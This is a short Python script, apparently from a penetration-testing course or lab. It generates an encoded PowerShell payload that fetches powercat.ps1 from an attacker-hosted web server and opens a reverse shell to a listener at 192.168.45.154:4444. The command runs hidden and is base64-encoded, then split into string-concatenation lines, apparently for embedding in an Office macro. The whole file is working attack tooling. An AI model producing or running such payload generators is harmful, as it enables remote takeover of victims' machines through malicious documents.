#!/usr/bin/env python3

import base64

# before you get going, download powercat.ps1 from https://github.com/besimorhino/powercat
# then host it on a web server with a quick `python3 -m http.server 80` in the directory where powercat.ps1 is located

# the IP address and port you're listening on
ip_address ="192.168.45.154"
port = "4444"

# the command to encode
command = "IEX(New-Object System.Net.WebClient).DownloadString('http://" + ip_address + "/powercat.ps1');powercat -c " + ip_address + " -p " + port + " -e powershell"
encoded_command = base64.b64encode(command.encode("utf-16le")).decode("utf-8")

str = "powershell.exe -nop -w hidden -e " + encoded_command
max_length = 50

for i in range(0, len(str), max_length):
	print("Str = Str + " + '"' + str[i:i+max_length] + '"')
